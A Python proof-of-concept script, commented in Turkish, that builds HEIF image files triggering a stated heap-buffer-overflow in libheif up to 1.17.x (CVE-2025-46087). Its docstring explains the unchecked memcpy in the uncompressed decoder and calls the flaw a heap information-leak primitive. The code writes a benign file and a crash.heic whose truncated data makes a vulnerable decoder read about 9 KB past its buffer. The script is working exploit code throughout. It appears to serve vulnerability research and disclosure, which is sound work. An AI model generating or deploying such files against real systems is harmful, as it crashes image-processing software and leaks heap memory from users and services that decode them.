#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
craft_heic.py — CVE-2025-46087 (libheif <= 1.17.x, heap-buffer-overflow) PoC üreticisi.

Zafiyet (strukturag/libheif issue #1508, v1.18.0'da düzeltildi):
  UncompressedImageCodec::decode_uncompressed_image() içinde,
  uncompressed_image.cc:756:

      uint32_t bytes_per_channel = width * height;            // ispe'den
      memcpy(dst, uncompressed_data.data() + c*bytes_per_channel,
             bytes_per_channel);                              // veri uzunluğu KONTROLSÜZ!

  ispe 96x96 dersek 9216 bayt kopyalanır; dosya 96 baytlık 'unci' verisi
  taşıyorsa 96 baytlık std::vector'ten 9120 bayt SADECE HEP VE ÖTESİ okunur.
  Kopyalanan veri decoder çıktısına (piksel düzlemine) yazıldığı için bu aynı
  zamanda bir HEAP INFO-LEAK primitive'idir — HEIF Heist'in "heist" kısmı.

Üretilen dosyalar:
  benign.heic — tam veri (9216 B): pipeline'ın NORMAL çalıştığını gösterir.
  crash.heic  — kısa veri (96 B): taşma tetiklenir (ASAN altında kanıt, düz
                derlemede komşu heap çıktı görüntüsüne sızar).
"""

import struct
import sys
import os

W = H = 96
COMPONENT_TYPE_MONOCHROME = 0
SECRET_PATTERN = b"HEIST"


def box(btype: bytes, payload: bytes) -> bytes:
    return struct.pack(">I", 8 + len(payload)) + btype + payload


def fullbox(btype: bytes, version: int, flags: int, payload: bytes) -> bytes:
    return box(btype, struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload)


def u16(v): return struct.pack(">H", v)
def u32(v): return struct.pack(">I", v)
def fcc(s): return s.encode("ascii")


def build_unci_heic(payload: bytes) -> bytes:
    """Minimal 'unci' (ISO 23001-17 uncompressed) HEIF dosyası."""
    # --- ftyp ------------------------------------------------------------
    ftyp = box(b"ftyp", fcc("mif1") + u32(0) + fcc("mif1") + fcc("heic") + fcc("unci") + fcc("miaf"))

    # --- meta children ---------------------------------------------------
    hdlr = fullbox(b"hdlr", 0, 0, u32(0) + fcc("pict") + u32(0) * 3 + b"\x00")

    pitm = fullbox(b"pitm", 0, 0, u16(1))

    infe = fullbox(b"infe", 2, 0, u16(1) + u16(0) + fcc("unci") + b"leak\x00")
    iinf = fullbox(b"iinf", 0, 0, u16(1) + infe)

    ispe = fullbox(b"ispe", 0, 0, u32(W) + u32(H))
    cmpd = box(b"cmpd", u32(1) + u16(COMPONENT_TYPE_MONOCHROME))
    uncC = fullbox(
        b"uncC", 0, 0,
        u32(0)                      # profile
        + u32(1)                    # component_count
        + u16(0)                    #   component_index
        + bytes([8 - 1])            #   component_bit_depth (stored -1)
        + bytes([0])                #   component_format: unsigned
        + bytes([0])                #   component_align_size
        + bytes([0])                # sampling_type: no subsampling
        + bytes([0])                # interleave_type: 0 = component (planar) ← zafiyetli dal
        + bytes([0])                # block_size
        + bytes([0])                # flags (big-endian, no pad)
        + u32(0)                    # pixel_size
        + u32(0)                    # row_align_size
        + u32(0)                    # tile_align_size
        + u32(0)                    # num_tile_cols - 1
        + u32(0)                    # num_tile_rows - 1
    )
    ipco = box(b"ipco", ispe + cmpd + uncC)

    # ipma: item 1 -> property indices 1,2,3 (ispe, cmpd, uncC), non-essential
    ipma = fullbox(b"ipma", 0, 0, u32(1) + u16(1) + bytes([3, 1, 2, 3]))
    iprp = box(b"iprp", ipco + ipma)

    # --- meta kabaca kurulur, iloc offset'i sonradan yamalanır -----------
    def make_iloc(data_offset: int) -> bytes:
        # v0: offset_size=4, length_size=4, base_offset_size=0
        return fullbox(
            b"iloc", 0, 0,
            bytes([0x44, 0x00]) + u16(1)                       # item_count
            + u16(1) + u16(0)                                  # item_ID, data_ref_index
            + u16(1)                                           # extent_count
            + u32(data_offset) + u32(len(payload))             # extent_offset/length
        )

    iloc = make_iloc(0)
    meta = fullbox(b"meta", 0, 0, hdlr + pitm + iinf + iprp + iloc)
    mdat = box(b"mdat", payload)

    file_bytes = ftyp + meta + mdat
    data_offset = file_bytes.index(mdat) + 8

    # iloc'u gerçek offset ile yeniden kur
    iloc = make_iloc(data_offset)
    meta = fullbox(b"meta", 0, 0, hdlr + pitm + iinf + iprp + iloc)
    mdat = box(b"mdat", payload)
    return ftyp + meta + mdat


def main() -> int:
    out_dir = os.path.dirname(os.path.abspath(__file__))
    poc_dir = os.path.join(out_dir, "poc")
    os.makedirs(poc_dir, exist_ok=True)

    # benign: 96x96 = 9216 bayt, gri dikey gradyan (decoder tam dolu okur)
    benign = bytes(((x * 2) & 0xFF) for y in range(H) for x in range(W))
    with open(os.path.join(poc_dir, "benign.heic"), "wb") as f:
        f.write(build_unci_heic(benign))

    # crash: yalnızca 96 bayt → 9216 bayt okunur → 9120 bayt heap taşması
    short = (SECRET_PATTERN + b"-SECRET-LEAK-PAGE-") * (96 // 18 + 1)
    with open(os.path.join(poc_dir, "crash.heic"), "wb") as f:
        f.write(build_unci_heic(short[:96]))

    print("OK: poc/benign.heic (tam veri) ve poc/crash.heic (96 B kısa veri) üretildi.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
